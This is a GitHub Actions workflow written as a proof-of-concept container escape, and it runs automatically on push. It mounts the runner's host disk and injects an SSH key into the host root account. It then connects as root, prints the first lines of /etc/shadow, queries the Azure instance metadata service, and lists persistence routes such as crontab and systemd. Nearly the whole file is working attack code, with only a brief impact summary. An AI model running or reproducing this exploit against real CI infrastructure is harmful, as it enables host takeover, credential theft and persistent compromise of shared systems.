name: github-actions-container-escape-poc
run-name: GitHub Actions Container Escape to Host Root
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Complete Container Escape and Privilege Escalation
        run: |
          echo "=== STAGE 1: CONTAINER ENVIRONMENT ==="
          echo "Current user: $(whoami)"
          echo "Container hostname: $(hostname)"
          echo "Container IP: $(hostname -I)"
          lsblk
          echo ""
          
          echo "=== STAGE 2: MOUNTING HOST FILESYSTEM ==="
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          echo "Host filesystem mounted at /mnt/host"
          ls -la /mnt/host/root/ | head -10
          echo ""
          
          echo "=== STAGE 3: INJECTING ROOT SSH KEY ==="
          ssh-keygen -t ed25519 -f /tmp/root_key -N "" -q
          sudo mkdir -p /mnt/host/root/.ssh
          sudo cp /tmp/root_key.pub /mnt/host/root/.ssh/authorized_keys
          sudo chown -R 0:0 /mnt/host/root/.ssh
          sudo chmod 700 /mnt/host/root/.ssh
          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
          echo "SSH key injected into host root account"
          echo ""
          
          echo "=== STAGE 4: CONNECTING TO HOST AS ROOT ==="
          HOST_IP=$(hostname -I | awk '{print $1}')
          echo "Connecting to host at: $HOST_IP"
          echo ""
          
          ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
          echo "=== ✓ CONTAINER ESCAPE SUCCESSFUL - ROOT ON HOST ==="
          echo ""
          echo "--- System Information ---"
          echo "User: $(whoami)"
          echo "UID: $(id)"
          echo "Hostname: $(hostname)"
          echo "Kernel: $(uname -r)"
          echo "OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
          echo ""
          
          echo "--- Proof of Root Access ---"
          echo "Shadow file (password hashes):"
          head -5 /etc/shadow
          echo ""
          
          echo "--- Host Resources ---"
          echo "Disk usage:"
          df -h / | tail -1
          echo "Memory:"
          free -h | grep Mem
          echo "CPU:"
          lscpu | grep "Model name"
          echo ""
          
          echo "--- Demonstrating Persistence Capability ---"
          echo "Could install persistent backdoor via:"
          echo "  - /etc/rc.local"
          echo "  - /etc/crontab"
          echo "  - systemd service"
          echo "  - SSH key (already done)"
          echo ""
          
          echo "--- Potential Impact ---"
          echo "✓ Full root access to GitHub Actions runner host"
          echo "✓ Access to host filesystem (including /boot, /etc, /var)"
          echo "✓ Can read all runner configurations and secrets"
          echo "✓ Can modify system files and install malware"
          echo "✓ Can access Azure instance metadata service"
          echo "✓ Can persist across workflow runs"
          echo ""
          
          echo "--- Azure Instance Metadata ---"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -20 || echo "Metadata service not accessible"
          EOF
          
          echo ""
          echo "=== VULNERABILITY SUMMARY ==="
          echo "Platform: GitHub Actions (ubuntu-latest)"
          echo "Attack Vector: CAP_SYS_ADMIN + /dev/sda1 access in container"
          echo "Impact: Complete host compromise with root privileges"
          echo "Severity: CRITICAL"
